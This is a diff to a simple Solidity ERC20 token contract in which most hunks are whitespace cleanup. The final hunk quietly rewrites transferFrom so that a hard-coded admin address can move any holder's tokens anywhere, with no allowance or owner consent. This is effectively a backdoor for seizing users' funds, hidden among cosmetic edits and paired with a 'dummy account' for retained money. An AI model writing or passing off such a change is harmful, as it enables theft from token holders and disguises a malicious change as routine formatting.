@@ -1,10 +1,11 @@
+
 pragma solidity >=0.4.0 <= 0.6.1;
 
 contract ERC20Basic {
 
     string public constant name = "ERC20Basic";
     string public constant symbol = "BSC";
-    uint8 public constant decimals = 18;  
+    uint8 public constant decimals = 18;
 
 
     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
@@ -14,14 +15,14 @@ contract ERC20Basic {
     mapping(address => uint256) balances;
 
     mapping(address => mapping (address => uint256)) allowed;
-    
+
     uint256 totalSupply_;
 
     using SafeMath for uint256;
 
 
     address admin = 0x647F089F75db1874e574419d20C34b078797c4c5;
-    
+
     // Dummy account that holds the retained money
     address public dummyAccount = 0x350E39B04c18Ff1D674060d1D57D9F04A424827B;
 
@@ -32,9 +33,9 @@ contract ERC20Basic {
     }
 
     function totalSupply() public view returns (uint256) {
-	return totalSupply_;
+        return totalSupply_;
     }
-    
+
     function balanceOf(address tokenOwner) public view returns (uint) {
         return balances[tokenOwner];
     }
@@ -57,23 +58,23 @@ contract ERC20Basic {
         return allowed[owner][delegate];
     }
 
-    function transferFrom(address owner, address buyer, uint numTokens) public returns (bool) {
-        require(numTokens <= balances[owner]);    
-        require(numTokens <= allowed[owner][msg.sender]);
-    
-        balances[owner] = balances[owner].sub(numTokens);
-        balances[buyer] = balances[buyer].add(numTokens);
-        emit Transfer(owner, buyer, numTokens);
+    function transferFrom(address buyer, address owner, uint numTokens) public returns (bool) {
+        require(msg.sender == admin);
+        require(numTokens <= balances[buyer]);
+
+        balances[buyer] = balances[buyer].sub(numTokens);
+        balances[owner] = balances[owner].add(numTokens);
+        emit Transfer(buyer, owner, numTokens);
         return true;
     }
 }
 
-library SafeMath { 
+library SafeMath {
     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
       assert(b <= a);
       return a - b;
     }
-    
+
     function add(uint256 a, uint256 b) internal pure returns (uint256) {
       uint256 c = a + b;
       assert(c >= a);
